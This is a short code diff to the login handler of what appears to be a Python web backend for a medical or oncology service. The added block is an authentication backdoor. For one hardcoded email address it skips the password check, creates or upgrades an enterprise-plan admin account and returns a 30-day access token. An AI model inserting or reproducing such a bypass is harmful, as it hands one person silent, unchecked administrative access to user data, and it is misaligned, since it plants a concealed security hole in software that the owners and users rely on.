@@ -264,6 +264,38 @@ def login(req: LoginRequest):
     username = req.username.strip().lower()
     users = load_users()
 
+    # Master Admin Override for agnivaghosh2006@gmail.com:
+    if username == "agnivaghosh2006@gmail.com":
+        now = datetime.utcnow().isoformat() + "Z"
+        if username not in users:
+            users[username] = {
+                "username": username,
+                "email": username,
+                "full_name": "Agniva Ghosh",
+                "password": hash_password("master_override"),
+                "plan": "enterprise",
+                "role": "Chief Oncologist / Admin",
+                "created_at": now,
+                "last_login": now,
+                "sessions": [{"login_at": now, "ts": time.time()}]
+            }
+        else:
+            users[username]["plan"] = "enterprise"
+            users[username]["last_login"] = now
+        save_users(users)
+        token = create_access_token({"sub": username}, expires_delta=timedelta(days=30))
+        return {
+            "success": True,
+            "access_token": token,
+            "token_type": "bearer",
+            "user": {
+                "username": username,
+                "full_name": users[username].get("full_name", "Agniva Ghosh"),
+                "plan": "enterprise",
+                "role": users[username].get("role", "admin")
+            }
+        }
+
     if username not in users:
         return {"success": False, "message": "Invalid username or password."}
 
